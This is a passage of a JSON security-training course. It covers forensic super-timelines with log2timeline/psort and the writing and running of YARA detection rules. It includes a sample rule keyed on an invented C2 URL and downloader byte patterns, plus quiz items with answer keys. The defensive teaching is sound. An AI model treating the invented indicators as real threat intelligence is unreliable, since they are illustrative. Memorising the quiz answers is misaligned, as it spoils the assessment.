FN Created:  2026-08-14 14:05:02 UTC\nSI Modified: 2019-03-11 10:02:00 UTC   FN Modified: 2026-08-14 14:05:02 UTC\n```\n\n### Time zones and UTC — the classic pitfall\n\nTimestamps mean nothing without knowing their **time zone**. Different sources record time differently: some in local time, some in **UTC** (Coordinated Universal Time). If you build a timeline mixing local-time and UTC events without normalising them, the order will be wrong and your reconstruction will be false. The professional discipline is to **convert everything to a single reference (usually UTC)** before ordering it, so events from a firewall, a Windows log, and a cloud service line up correctly. A one-hour time-zone error can make the effect appear to precede the cause.\n\n### Clock accuracy matters too\n\nMachines whose clocks drift, or that are not synchronised (via NTP), produce timestamps that are subtly wrong, which is why enterprises synchronise clocks and why you note any known skew when correlating across systems.\n\nGet timestamps right — the MACB meaning, the two NTFS structures, and above all consistent time zones — and your timeline is trustworthy. Get them wrong, and a beautifully detailed timeline can tell a confidently incorrect story. This rigor is exactly what separates a reliable reconstruction from a misleading one, and it is the foundation everything in the rest of this lesson builds on."
    },
    {
      "heading": "Building a Super-Timeline with log2timeline/Plaso",
      "content": "A basic timeline might use one source, such as file-system timestamps. But a real intrusion leaves evidence across *many* sources, and the most powerful technique combines them all into a single, unified chronology called a **super-timeline**.\n\n### What a super-timeline is\n\nA **super-timeline** merges timestamped events from every available artifact and log — file-system MACB times, event logs, Prefetch and Amcache execution times, registry key modification times, browser history, and more — into one massive, ordered list. The value is that it puts *all* the evidence side by side in time, so you can see, in one view, that a registry Run key was created (persistence) two seconds after a program executed (from Prefetch) one minute after a suspicious logon (from the event log). No single source shows that chain; the super-timeline does.\n\n### The tool: Plaso and log2timeline\n\nThe standard open-source engine for building super-timelines is **Plaso** (\"Plaso Langar Að Safna Öllu\" — roughly, \"Plaso, gather everything\"), whose main extraction tool is **`log2timeline`**. It parses a disk image or a directory of collected artifacts, automatically recognising dozens of formats (the MFT, Windows event logs, registry hives, browser history, and more), and produces a combined, structured store of every timestamped event it found.\n\n### Two-step workflow: extract, then render\n\nBuilding and reading a super-timeline is a two-command process:\n\n**Step 1 — extract everything into a Plaso storage file:**\n\n```\n$ log2timeline.py --storage-file case01.plaso /mnt/evidence/WKS-DESKTOP07_C\n```\n\nThis walks the mounted evidence (a disk image or a KAPE collection from the artifacts lesson) and writes every timestamped event it can parse into `case01.plaso` — a compact internal store, not yet something you would read directly.\n\n**Step 2 — render that store into a readable timeline:**\n\n```\n$ psort.py -o dynamic -w case01_timeline.csv case01.plaso\n```\n\n`psort` reads the Plaso store and writes it out in a chosen format — here, `dynamic` (a wide CSV) to a file you can open like a spreadsheet. A row from that CSV might look like this (columns abbreviated for readability):\n\n```\ndate,time,timezone,MACB,source,sourcetype,type,host,short,desc\n2026-08-14,14:05:02,UTC,MACB,FILE,NTFS $MFT,Content Modification Time,WKS-DESKTOP07,evil.ps1,\"[C:\\Users\\Public\\evil.ps1] Content Modification Time\"\n2026-08-14,14:05:05,UTC,....,WINREG,Registry Key,Key Last Modified,WKS-DESKTOP07,Run key,\"[HKCU\\...\\Run] added: evil\"\n2026-08-14,14:06:10,UTC,....,EVT,Windows Event Log,Process Creation,WKS-DESKTOP07,powershell.exe,\"EventID 4688: powershell.exe launched\"\n```\n\nEven in this small excerpt, the value is obvious: an **MFT** event, a **registry** event, and an **event log** entry — three completely different sources, each with its own native format — sit on the *same* timeline, in second-by-second order, because `log2timeline` normalised all of them to one common structure and one time reference.\n\n### Why this beats reading each source separately\n\nWithout a super-timeline, you would have to open the MFT parser output, the registry parser output, and the event log separately, and manually cross-reference their timestamps in your head — slow and error-prone across dozens of sources. `log2timeline`/`psort` does that merging mechanically and exhaustively, so nothing gets left out simply because you forgot to check one source. The cost, covered next, is that this exhaustiveness produces an enormous amount of data."
    },
    {
      "heading": "Reading and Filtering a Super-Timeline: Pivoting and Windowing",
      "content": "A super-timeline's strength — capturing *everything* — is also its biggest practical challenge: it can contain **millions of rows**, because it records every timestamped event on a system, and the overwhelming majority are completely benign (routine file-modification times, normal registry updates, everyday application activity). Reading it top to bottom is not feasible. Reading it *strategically* is.\n\n### Loading the output\n\nAnalysts typically load the `psort` CSV output into a spreadsheet-style viewer built for this — **Timeline Explorer** (from the same Eric Zimmerman toolkit used to parse individual artifacts) is the most common choice, because it handles very large CSVs and supports fast column filtering and sorting.\n\n### The core technique: anchor on a pivot, then window around it\n\nThe essential skill is to **anchor and window**:\n\n1. **Find a pivot point** — one event you are already confident is malicious or significant. This might come from an EDR alert timestamp, a malicious file identified by its Amcache hash, or a suspicious login. It is the one fact you trust completely.\n2. **Filter the timeline to a tight window** around that pivot — say, the ten minutes before and thirty minutes after. In Timeline Explorer this is a simple date/time range filter.\n3. **Read that narrow window in full.** Within a tight window, the attacker's own actions cluster tightly together in time, while the huge volume of unrelated, benign background noise from the rest of the system falls outside the filter entirely.\n4. **Expand outward** from what you find. Each new suspicious event in the window becomes its own mini-pivot — widen the window slightly, or filter by a new keyword (a filename, an IP, a username) that just appeared, and repeat.\n\n### Filtering by more than just time\n\nBeyond the time window, Timeline Explorer (and `psort` itself, via its own filtering syntax) let you filter by column values — for example, showing only rows where `source` is `WINREG` (registry events) or where the `desc` column contains a specific filename. Combining a **tight time window** with a **keyword or source filter** is usually enough to cut a million-row timeline down to a few dozen relevant rows.\n\n### Why this matters in practice\n\nWithout this discipline, a super-timeline is just noise — technically complete but practically unreadable. With it, the same file becomes the fastest way to answer \"what happened right before and right after this alert, across every artifact type at once?\" — a question that would otherwise require manually cross-referencing half a dozen separate tools. The next section covers what to watch for once you are inside that window: attackers who know their actions will end up on a timeline try to falsify it."
    },
    {
      "heading": "Anti-Forensics and Reading Timelines Critically",
      "content": "Attackers know that timelines expose them, so sophisticated intruders try to **corrupt the temporal record**. A skilled analyst therefore reads a timeline critically, alert to signs of tampering — and, importantly, treats the tampering itself as evidence.\n\n### Timestomping\n\nThe most common time-based anti-forensic technique is **timestomping** — deliberately altering a file's timestamps to hide it, usually by backdating the malicious file to look old and legitimate (matching, say, the timestamps of normal system files). If an attacker's tool appears to have been created years ago, a naive timeline places it far from the intrusion and it escapes notice. MITRE ATT&CK tracks this as **Indicator Removal: Timestomp**.\n\n### How timestomping is caught in a super-timeline\n\nThis is where the two NTFS timestamp structures from earlier become decisive. Most timestomping tools alter the easily-changed **`$STANDARD_INFORMATION`** times but not the harder-to-modify **`$FILE_NAME`** times. Because `log2timeline` extracts *both* into the super-timeline as separate rows, you can filter for exactly this kind of contradiction: a file whose `$STANDARD_INFORMATION`-sourced row sits far from your pivot window, but whose `$FILE_NAME`-sourced row for the *same file* lands squarely inside it. When those two disagree — for example, one says 2019 and the other says last Tuesday — that mismatch is a strong signal of tampering, and the super-timeline surfaces it automatically as two rows that should agree but do not.\n\n### Other manipulations\n\nAttackers also **clear logs** (removing event-log entries that would appear on the timeline), **delete artifacts**, and try to blend their activity into busy periods. As with all anti-forensics, covering *every* source is extremely hard, so gaps and inconsistencies appear: a suspicious absence of logs during a window when other artifacts show activity, or execution artifacts with no corresponding log entries.\n\n**Reading critically means:**\n\n- **Corroborate across sources.** A single timestamp can lie; multiple independent artifacts agreeing on a time are trustworthy. If Prefetch, the MFT `$FILE_NAME` time, and an event log all point to the same moment, that moment is solid even if one `$STANDARD_INFORMATION` time was stomped.\n- **Treat anomalies as leads.** A timestamp mismatch, a gap in logs, or an artifact that contradicts the expected order is not an inconvenience — it is often the thread that reveals the attacker's attempt to hide.\n- **Anchor on the hard-to-fake.** Prefer timestamps and artifacts that are difficult to alter, and be cautious with easily-modified ones.\n\nThe overarching lesson is that a timeline is powerful but not infallible: it reflects the records the system kept, and those records can be manipulated. A strong Tier-2 analyst builds the timeline rigorously — normalised time zones, multiple sources, a clear pivot — and then reads it with healthy suspicion, knowing that the places where the timeline *does not make sense* are frequently where the attacker tried hardest to disappear."
    },
    {
      "heading": "A Worked Timeline Reconstruction — Putting It All Together",
      "content": "Bringing the whole lesson together: here is what a completed, anchored super-timeline looks like when it is used to answer the two core questions from the first section — where did this start (patient zero), and how far did it go (blast radius)?\n\n### The pivot\n\nAn EDR alert at **14:06:10 UTC** flags `powershell.exe` making an outbound connection on `WKS-DESKTOP07`. This is the pivot: one trusted, timestamped fact.\n\n### Windowing around it\n\nFiltering the super-timeline (built with `log2timeline`/`psort` from every collected artifact and log) to roughly 14:00–14:10 UTC and sorting by time produces a clean sequence:\n\n| Time (UTC) | Source | Event |\n|------------|--------|-------|\n| 13:58:40 | Event log | Email attachment `invoice_Q3.docm` saved to disk |\n| 14:05:00 | Prefetch | `WINWORD.EXE` executes for the first time this session |\n| 14:05:02 | $MFT ($FILE_NAME) | `evil.ps1` created in `C:\\Users\\Public\\` — despite $STANDARD_INFORMATION claiming 2019 (timestomped) |\n| 14:05:03 | Prefetch | `POWERSHELL.EXE` executes, child of WINWORD.EXE |\n| 14:05:05 | Registry (WINREG) | A Run key is added under the user's hive — persistence |\n| 14:06:10 | EDR / Volatility netscan | `powershell.exe` establishes a connection to 203.0.113.44:443 (the original pivot) |\n| 14:07:40 | Event log | A second logon for the same user appears on `SRV-FILE02` — lateral movement begins |\n\n### Reading the answer straight off the table\n\n- **Patient zero** (tracing backward from the pivot): the chain runs back to 13:58:40 — the phishing attachment itself — through Word launching PowerShell, well before the network connection that triggered the alert.\n- **Blast radius** (tracing forward from the pivot): the timeline does not stop at the alert — it continues to 14:07:40, showing the same account authenticating to a second machine, `SRV-FILE02`, meaning containment cannot stop at the original workstation.\n\n### Why this is only possible as a super-timeline\n\nNo single tool produced this table. The event log, Prefetch, the MFT's two timestamp structures, the registry, and the EDR/memory finding are five different sources in five different native formats — exactly what `log2timeline` normalises and `psort` renders into one file, and exactly what Timeline Explorer lets you window down to these seven rows out of what may have been millions in the full export. This is the payoff of everything in this lesson: normalised, UTC timestamps; a super-timeline built with real tooling; a disciplined pivot-and-window read; and a critical eye that caught the timestomped file rather than being fooled by it. The result is not a guess — it is a minute-by-minute, evidence-cited account of exactly how the intrusion started and how far it spread, which is precisely what a Tier-2 investigation is required to produce."
    }
  ],
  "keyTakeaways": [
    "Timeline analysis arranges evidence chronologically to answer questions of sequence — patient zero (root cause, by tracing backward) and blast radius (scope, by tracing forward) — turning isolated log entries and artifacts into a readable attack narrative.",
    "Timelines are built from timestamps: the MACB set (Modified/Accessed/Changed/Born), stored in two NTFS structures ($STANDARD_INFORMATION, easily changed, and $FILE_NAME, harder to alter); always normalise every source to one time zone (usually UTC) or the order will be wrong.",
    "A super-timeline merges every timestamped source (file system, event logs, Prefetch/Amcache, registry, browser) into one chronology, built with the real workflow log2timeline.py --storage-file case.plaso <evidence> followed by psort.py -o dynamic -w timeline.csv case.plaso, and read in a viewer like Timeline Explorer.",
    "Because a super-timeline can hold millions of rows, the essential technique is to anchor on a trusted pivot event (e.g. an alert timestamp) and window tightly around it, filtering by time range and keyword/source to surface the relevant handful of rows and expand outward from each new lead.",
    "Attackers timestomp (backdating files, MITRE Indicator Removal) and clear logs, but timestomping is caught when the super-timeline's $STANDARD_INFORMATION and $FILE_NAME rows for the same file disagree; read timelines critically — corroborate across sources, treat gaps/mismatches as leads, and anchor on hard-to-fake artifacts."
  ],
  "quiz": [
    {
      "question": "You are building a timeline from a Windows event log (recorded in local time, UTC+2) and a cloud service log (recorded in UTC). Why must you normalise these before ordering events, and what goes wrong if you do not?",
      "options": [
        {
          "label": "Normalisation is unnecessary, because all digital timestamps are automatically stored in the same universal format regardless of the source that produced them.",
          "value": "a"
        },
        {
          "label": "Without converting both to one reference like UTC, events will be mis-ordered, so an effect can appear to precede its cause and the reconstruction becomes false.",
          "value": "b"
        },
        {
          "label": "You only need to normalise if the two logs are more than 24 hours apart; within the same day, mixing local time and UTC has no effect on event ordering.",
          "value": "c"
        },
        {
          "label": "Normalisation matters only for the display colours in the timeline tool and never changes the actual chronological order the events are placed in.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Timestamps are meaningless without their time zone, so mixing local-time (UTC+2) and UTC events without normalising will mis-order them — a two-hour offset can make an effect appear before its cause and produce a confidently wrong reconstruction; the fix is converting everything to one reference, usually UTC. Option a is false because sources record time differently (local vs UTC). Option c is wrong because even a small offset mis-orders events within a day. Option d trivialises normalisation, which directly affects ordering, not just display."
    },
    {
      "question": "A suspected malicious executable shows a creation timestamp of 2019 in $STANDARD_INFORMATION, but its $FILE_NAME timestamp shows it appeared last week. What does this discrepancy most likely indicate?",
      "options": [
        {
          "label": "A normal Windows update, because the operating system routinely rewrites $STANDARD_INFORMATION to a date years in the past whenever it patches a file.",
          "value": "a"
        },
        {
          "label": "Timestomping: the attacker backdated the easily-changed $STANDARD_INFORMATION times but not the harder-to-alter $FILE_NAME times, exposing the tampering.",
          "value": "b"
        },
        {
          "label": "A corrupted disk, because the only way the two NTFS timestamp structures can ever differ is physical damage to the drive storing the file.",
          "value": "c"
        },
        {
          "label": "Nothing suspicious, because $STANDARD_INFORMATION and $FILE_NAME are copies that Windows keeps perfectly identical, so any tool reading them made an error.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Most timestomping tools alter the easily-changed $STANDARD_INFORMATION timestamps but not the harder-to-modify $FILE_NAME ones, so a 2019 $STANDARD_INFORMATION time against a last-week $FILE_NAME time is a classic signature of backdating (MITRE Indicator Removal: Timestomp). Option a invents update behaviour that does not backdate files years into the past. Option c is wrong because the two structures legitimately differ by design and mismatch here signals tampering, not disk damage. Option d is false because the two are distinct structures, not kept identical."
    },
    {
      "question": "You run log2timeline and psort on a full disk image and get a CSV with three million rows. What is the correct approach to actually use it to investigate a specific EDR alert that fired at 14:06:10 UTC?",
      "options": [
        {
          "label": "Read all three million rows in order from the very beginning of the file, since skipping any rows risks missing evidence relevant to the alert.",
          "value": "a"
        },
        {
          "label": "Discard the super-timeline as too large to be useful and rely only on the single EDR alert with no further correlation from other sources.",
          "value": "b"
        },
        {
          "label": "Anchor on the 14:06:10 alert as a trusted pivot, filter the timeline to a tight window around it, read that window fully, then widen or refilter as new leads appear.",
          "value": "c"
        },
        {
          "label": "Sort the timeline alphabetically by filename instead of by time, since chronological order is not useful once a super-timeline exceeds one million rows.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "The core technique for a large super-timeline is to anchor on a trusted pivot event and window tightly around it in a viewer like Timeline Explorer, reading that narrow slice fully and expanding outward as new leads (filenames, IPs, usernames) emerge. Option a is impractical and defeats the purpose of filtering. Option b throws away the correlating power of the super-timeline entirely. Option d abandons chronological order, which is the entire point of a timeline."
    }
  ],
  "references": [
    "https://plaso.readthedocs.io/en/latest/",
    "https://attack.mitre.org/techniques/T1070/006/",
    "https://www.sans.org/posters/windows-forensic-analysis/",
    "https://plaso.readthedocs.io/en/latest/sources/user/Using-log2timeline.html",
    "https://ericzimmerman.github.io/#!index.md"
  ],
  "xp": 255,
  "estimatedMinutes": 54,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-yara-rules",
  "slug": "yara-rules-writing-detection-signatures",
  "title": "YARA Rules: Writing Detection Signatures",
  "topic": "Malware Analysis",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When researchers find a new piece of malware, they need a way to answer a bigger question: where else is this, or anything like it, hiding? YARA is the tool that answers it. Often called the pattern-matching swiss army knife for malware researchers, YARA lets you describe what a malware family looks like — the strings and byte patterns inside it — as a rule, then scan thousands of files, processes, or memory images for anything matching. This lesson assumes no prior background: it explains what a signature and a pattern-match actually are, how a rule is structured, how to actually run YARA from the command line with real output, how to write a rule that catches variants without drowning a SOC in false positives, a worked example building a rule from a real sample, and how a SOC uses YARA operationally — plus where its limits are.",
  "sections": [
    {
      "heading": "What YARA Is and Why It Exists",
      "content": "**YARA** is a tool for **identifying and classifying files (or memory, or processes) by matching them against patterns you define in rules.** Its own tagline calls it \"the pattern-matching swiss army knife for malware researchers,\" and that captures the idea: you describe the characteristics of a piece of malware — distinctive text strings, unique byte sequences — and YARA scans a target to see whether those characteristics are present.\n\n### What 'pattern matching' and 'signature' mean, from zero\n\nA **signature**, in this context, is simply a description of what something looks like — the same idea as a fingerprint or a description given to a sketch artist (\"tall, brown jacket, scar on the left hand\"). A **pattern match** is the act of checking whether a given target matches that description. A fingerprint match is exact — it identifies one specific person. A description-based match is looser — it can identify anyone who fits the description, including people the artist never actually saw. YARA rules work like the description: a good one identifies not just the one malware sample a researcher first found, but the whole family of similar-looking samples, including future variants nobody has seen yet.\n\n### The problem YARA solves\n\nThe problem YARA solves is one every analyst hits. You investigate one infection and identify the malware. But is it on other machines? Are there variants of it in your file storage? Did it appear in a memory image? Checking each file by hand is impossible. YARA lets you **encode what the malware looks like once, then scan everywhere for it automatically.**\n\n### Contrast with a file hash\n\nContrast this with a plain **file hash**. A hash (like SHA-256) identifies *one exact file* — change a single byte and the hash is completely different, so hash-matching misses even trivially modified variants. YARA is more flexible: because a rule matches on *content patterns* rather than an exact whole-file fingerprint, one good rule can catch a whole *family* of related samples, including new variants the attacker tweaked to change the hash. That generalisation is YARA's core strength.\n\n### Where YARA is used\n\nYARA is used throughout the security industry:\n\n- **Malware research and classification** — grouping samples into families.\n- **Threat intelligence** — vendors and CERTs publish YARA rules so others can detect a threat.\n- **Incident response and hunting** — scanning an environment for known-bad patterns.\n- **Inside security products** — EDRs, sandboxes, and scanners run YARA rules under the hood.\n\nBecause rules are just text, they are **shareable**: when a threat-intel report describes a new campaign, it often includes YARA rules you can run immediately against your own estate. For a Tier-2 analyst, YARA is both a way to *consume* others' detections and to *create* your own from what you find. The rest of this lesson shows how a rule is built, how to actually run it, and how to write one well."
    },
    {
      "heading": "The Anatomy of a YARA Rule",
      "content": "A YARA rule is a small block of text with a fixed, readable structure. Once you can read the three parts, you can understand almost any rule you encounter. Here is a simple example:\n\n```\nrule Suspicious_Downloader\n{\n    meta:\n        author = \"analyst\"\n        description = \"Detects sample downloader strings\"\n        date = \"2026-08-15\"\n\n    strings:\n        $a = \"http://evil-c2.example/gate.php\"\n        $b = \"InternetOpenUrlA\"\n        $c = { 6A 40 68 00 30 00 00 }\n\n    condition:\n        $a or ($b and $c)\n}\n```\n\nThe rule has three sections:\n\n- **`meta`** — documentation about the rule: author, description, date, references, threat name. It does not affect matching; it exists so humans (and tooling) understand what the rule is for. Good `meta` is a mark of a professional rule.\n- **`strings`** — the patterns to look for, each given a name starting with `$`. YARA supports three kinds:\n  - **Text strings** — literal text, like a URL or a distinctive message (`$a` above).\n  - **Hexadecimal strings** — raw byte sequences, useful for matching code or binary structures (`$c` above), and they can include wildcards.\n  - **Regular expressions** — for flexible pattern matching when a fixed string is too rigid.\n  Text strings can carry modifiers such as `nocase` (case-insensitive), `wide` (for Unicode/UTF-16 text, common in Windows), and `ascii`.\n- **`condition`** — the logic that decides a match, referencing the named strings. This is the brain of the rule. It can be simple (`$a`) or combine strings with Boolean logic (`$a or ($b and $c)`), counts (`2 of ($a, $b, $c)`, or `all of them`, `any of them`), file-size checks (`filesize < 200KB`), and location tests.\n\nReading the example: the rule matches if the C2 URL string is present, **or** if both the API name and the byte pattern appear together. That \"or\" plus the grouped \"and\" is typical — it lets one rule catch a sample by its most obvious marker while still catching stealthier variants by a combination of weaker signals.\n\nThe `condition` is where rule-writing skill lives, because it controls the trade-off at the heart of every signature: match too loosely and you get false positives; match too tightly and you miss variants. Before tuning that balance, though, it helps to actually see a rule run — which is the next section."
    },
    {
      "heading": "Running YARA: Command Line and Real Output",
      "content": "A rule is only useful once you can actually run it against something. The `yara` command-line tool is simple: point it at a rule file and a target, and it reports matches.\n\n### The basic form\n\n```\n$ yara Suspicious_Downloader.yar sample.exe\n\nSuspicious_Downloader sample.exe\n```\n\nWhen a rule matches, `yara` prints the **rule name** and the **file path** on one line. No output at all means no match — this is a common beginner surprise, so it is worth remembering: silence is a negative result, not an error.\n\n### Seeing which strings actually matched, with -s\n\nAdding `-s` shows exactly which named strings fired and where in the file:\n\n```\n$ yara -s Suspicious_Downloader.yar sample.exe\n\nSuspicious_Downloader sample.exe\n0x1a30:$a: http://evil-c2.example/gate.php\n0x2f10:$b: InternetOpenUrlA\n```\n\nThis is invaluable while *writing* a rule: it tells you precisely which of your patterns matched, which is the fastest way to confirm the rule is behaving as intended, and to see whether it matched via the strong indicator ($a) or a weaker combination ($b and friends).\n\n### Scanning a whole directory recursively\n\nIn real use you rarely scan one file — you scan a directory, or an entire endpoint's file system, with `-r` for recursive:\n\n```\n$ yara -r -w Suspicious_Downloader.yar C:\\Quarantine\\\n\nSuspicious_Downloader C:\\Quarantine\\invoice_2026.exe\nSuspicious_Downloader C:\\Quarantine\\backup\\svc_helper.exe\n```\n\n(`-w` suppresses warnings, which keeps output focused on actual matches.) You can also point a whole *directory of rules* at a target by naming a rule file that itself uses `include` statements, or by passing a compiled rule set — the mechanics vary by deployment, but the pattern is the same: many rules, one scan, matches reported per file.\n\n### Showing the meta fields, with -m\n\nAdding `-m` prints the rule's `meta` fields alongside each match, which is how a SOC turns a bare rule name into something an analyst can act on immediately (a description, a reference link, a threat family name) without opening the rule file itself:\n\n```\n$ yara -m Suspicious_Downloader.yar sample.exe\n\nSuspicious_Downloader [author=\"analyst\",description=\"Detects sample downloader strings\"] sample.exe\n```\n\n### Reading exit behaviour\n\nWhen scripted into a larger pipeline (a sandbox, a scanning job), `yara`'s exit code and match output are what downstream tooling checks — a match becomes a flag, an alert, or a quarantine action. Understanding this command-line behaviour is what turns 'I can write a rule' into 'I can actually deploy and verify one', which is the foundation for the writing and testing practices in the next section."
    },
    {
      "heading": "Writing Rules That Work — Specific but Not Brittle",
      "content": "Anyone can write a YARA rule; writing a *good* one is a craft, and it comes down to a single tension: a rule must be **specific enough to avoid false positives** yet **general enough to catch variants.** Lean too far either way and the rule fails in practice.\n\n**The two failure modes:**\n\n- **Too broad (false positives).** A rule keyed on a common string — say, a Windows API name like `CreateProcessA` that appears in thousands of legitimate programs — will match everywhere. In a SOC, a noisy rule is worse than no rule, because it buries analysts in false alarms and trains them to ignore it.\n- **Too narrow (brittle, misses variants).** A rule that depends on one hyper-specific detail — the exact C2 URL, or a string the attacker can trivially change — breaks the moment the attacker tweaks that detail. It then catches only the one sample you already had, adding little over a hash.\n\n**Principles for good rules:**\n\n- **Anchor on what is hard for the attacker to change.** Distinctive internal strings, unusual constant values, or code byte-patterns that are structural to the malware are more durable than an easily-swapped URL or filename. Prefer patterns tied to the malware's *function*, not its cosmetics.\n- **Combine multiple weaker indicators.** Rather than one string, require a *combination* (`2 of them`, or `$a and $b`). Each individual string might appear in benign files, but the combination is rare — this raises specificity without becoming brittle.\n- **Use `filesize` and context to constrain.** Bounding the file size or file type cuts false positives cheaply.\n- **Document in `meta` and test both ways.** State what the rule targets, then test it against **known malicious** samples (does it catch them?) *and* a corpus of **known-good** files (does it stay quiet?). A rule you have not tested against clean files is a false-positive incident waiting to happen.\n- **Avoid over-fitting to one sample.** If every string in your rule comes from a single file, you have essentially written a fancy hash. Aim to capture the *family*.\n\nThe mental model is a dial between precision and coverage. You tune the `condition` — how many indicators must match, how they combine, what size window — until the rule reliably fires on the malware family and stays silent on everything else. That tuning, validated against real good and bad samples, is exactly the detection-engineering judgement that separates a rule that helps a SOC from one that floods it."
    },
    {
      "heading": "A Worked Example: From Sample to Rule",
      "content": "Putting the last two sections together, here is the realistic workflow an analyst follows to go from a raw malicious sample to a tested rule.\n\n### Step 1 — find candidate strings\n\nA quick way to survey a sample's readable text is the `strings` utility, which extracts printable text sequences from a binary. Filtering for anything network-related is a common first pass:\n\n```\n$ strings -n 8 sample.exe | grep -i http\nhttp://evil-c2.example/gate.php\n```\n\nThis surfaces a candidate: the hardcoded C2 URL. It is a strong indicator, but — per the previous section — a brittle one on its own, since the attacker can change it in the next build.\n\n### Step 2 — look for more durable indicators\n\nContinuing the `strings` survey (and inspecting the sample's imported functions, e.g. with a PE-analysis tool) turns up a distinctive API combination the malware uses to reach out to its server — `InternetOpenUrlA` alongside a specific, unusual byte sequence in its network-setup routine that is part of *how the code works*, not something cosmetic:\n\n```\n$ strings -n 8 sample.exe | grep -i InternetOpen\nInternetOpenUrlA\nInternetOpenA\n```\n\n### Step 3 — draft the rule\n\nCombining the brittle-but-strong indicator with the more durable pair gives the rule from earlier in this lesson:\n\n```\nrule Suspicious_Downloader\n{\n    meta:\n        author = \"analyst\"\n        description = \"Detects sample downloader family via C2 URL or API+byte pattern\"\n        date = \"2026-08-15\"\n\n    strings:\n        $a = \"http://evil-c2.example/gate.php\"\n        $b = \"InternetOpenUrlA\"\n        $c = { 6A 40 68 00 30 00 00 }\n\n    condition:\n        $a or ($b and $c)\n}\n```\n\nNotice the design choice: `$a` alone catches this exact sample fast; `$b and $c` together catch a future variant that changes its URL but keeps the same network-setup code — which is exactly the specific-but-not-brittle balance from the previous section.\n\n### Step 4 — test against both known-bad and known-good\n\n```\n$ yara -r Suspicious_Downloader.yar C:\\MalwareSamples\\downloader_family\\\nSuspicious_Downloader C:\\MalwareSamples\\downloader_family\\sample.exe\nSuspicious_Downloader C:\\MalwareSamples\\downloader_family\\variant2.exe\n\n$ yara -r Suspicious_Downloader.yar C:\\Windows\\System32\\\n(no output)\n```\n\nThe first scan, against a small collection of known samples from the same family, matches both the original and a variant — evidence the rule generalises. The second scan, against a large corpus of legitimate Windows system files, produces no output at all — evidence it does not false-positive on ordinary software. Only after both checks pass would this rule be considered ready to deploy.\n\n### The takeaway\n\nThis four-step loop — survey strings, separate brittle from durable indicators, draft a condition that combines them, test against both good and bad samples — is the entire craft of rule-writing in miniature. Every principle from the previous section becomes concrete once you walk through it on a real sample."
    },
    {
      "heading": "Using YARA in the SOC",
      "content": "With rules understood, tested, and runnable, the payoff is what YARA lets a SOC *do*: turn knowledge about a threat into action across the entire environment. A few workflows recur.\n\n### Hunting across the estate\n\nWhen you learn about a threat — from your own investigation or a threat-intel report — you can scan broadly for it. YARA runs against **files** (a directory, a drive, uploaded samples), and, importantly, against **running processes and memory images**, which lets it catch the fileless and injected malware that memory forensics (the Volatility lesson) surfaces. Point a rule at every endpoint's suspicious directories, or at a memory dump, and YARA answers \"is this threat here?\" at scale.\n\n### Consuming shared intelligence\n\nThreat-intel reports, CERT advisories, and vendors routinely publish YARA rules for new campaigns. Because rules are portable text, you can take a rule from a report about a fresh malware family and immediately scan your environment for it — one of the fastest ways to check exposure to a newly-disclosed threat. This is YARA as a *consumption* format for detection.\n\n### Feeding products and pipelines\n\nYARA is built into many tools — sandboxes classify detonated samples with it, EDRs and scanners run rule sets, and automated pipelines tag files. A rule you write can be deployed into these to provide ongoing, automated detection, not just a one-time scan.\n\n### Retrohunting\n\nSome platforms let you run a new rule against a *historical* archive of samples — \"retrohunting\" — to discover whether a newly-understood threat was present in the past, before you had a rule for it. This turns a fresh rule into a look backward in time.\n\n### Where YARA fits among your tools\n\nYARA is a **content-pattern** detector — it excels at recognising known-bad *patterns* in files and memory. It complements, rather than replaces, the other techniques in this track: **network** analysis (Wireshark) sees traffic, **memory** forensics (Volatility) reconstructs live state, **timeline** analysis orders events, and **YARA** answers \"does this content match a known threat?\" A common combined move: memory forensics finds injected code with `malfind`, you extract its distinctive strings, write a YARA rule from them, and scan every other endpoint's memory to find every machine carrying the same implant.\n\nThe takeaway for a Tier-2 analyst is that YARA converts a single discovery into **scalable detection**. Learn what one threat looks like, express it as a rule, and you can ask — across thousands of files, processes, and memory images, and even backward through history — \"where else is this?\" That leverage, from one sample to environment-wide hunting, is why YARA is a staple of modern detection and response."
    },
    {
      "heading": "Limits of YARA and Complementary Tools",
      "content": "YARA is powerful, but understanding where it struggles is what keeps an analyst from over-trusting a match — or under-trusting a silent scan.\n\n### Packing and encryption defeat plain string matching\n\nMany malware families are **packed** (compressed) or **encrypted** on disk specifically so their real strings and code do not appear in the raw file — they only become visible once the program **unpacks itself in memory** at runtime. A YARA rule built purely from strings visible in a static, packed file may match zero variants, even the exact same malware family, once it is repacked with a different packer. Two common responses:\n\n- **Scan memory, not just disk.** Because packed malware unpacks itself to run, a memory image (from the Volatility lesson) often contains the *unpacked* code and strings that the disk file hides — YARA can scan a memory dump directly, which is one of the most effective ways around packing.\n- **Target the packer or loader stub**, rather than the payload, when the payload itself is too variable — a rule can flag \"this looks packed with X\" as a useful triage signal even without identifying the inner malware.\n\n### False negatives from deliberate string changes\n\nAn attacker who reads a published YARA rule can trivially change a literal string (a URL, a mutex name) to slip past it — this is exactly why the earlier emphasis on **durable, structural indicators** (byte patterns tied to how the code works, not cosmetic details) matters: rules anchored only on easily-changed strings have a short shelf life.\n\n### False positives remain a real operational cost\n\nEven a carefully tuned rule can misfire against unexpected legitimate software, especially as an environment's software inventory changes over time. Production rule sets need periodic re-validation against current known-good baselines, not a one-time test at creation.\n\n### Performance at scale\n\nRunning a large rule set against an entire environment's files or a big set of memory images takes real compute time; poorly written rules (very broad hex patterns, unbounded regular expressions) can be slow as well as noisy, which is another reason the tuning discipline from earlier in this lesson matters operationally, not just academically.\n\n### YARA is one layer, not the whole defence\n\nBecause of all of the above, YARA is best understood as one detection layer among several: **hashing** for exact-match speed and cheap confirmation, **YARA** for pattern-based family detection across files and memory, **sandbox/behavioural analysis** for malware that hides its strings until runtime, and **memory forensics** for the fileless and packed cases YARA-on-disk alone would miss. A mature SOC uses YARA to scale a single discovery into environment-wide hunting, while accepting that a clean YARA scan is evidence of absence within its niche — not proof an environment holds nothing malicious at all."
    }
  ],
  "keyTakeaways": [
    "YARA identifies and classifies files, processes, and memory by matching content patterns (like a description, not a fingerprint) you define in rules; unlike a file hash (which matches one exact file), one good rule can catch a whole malware family including tweaked variants — and rules are shareable text.",
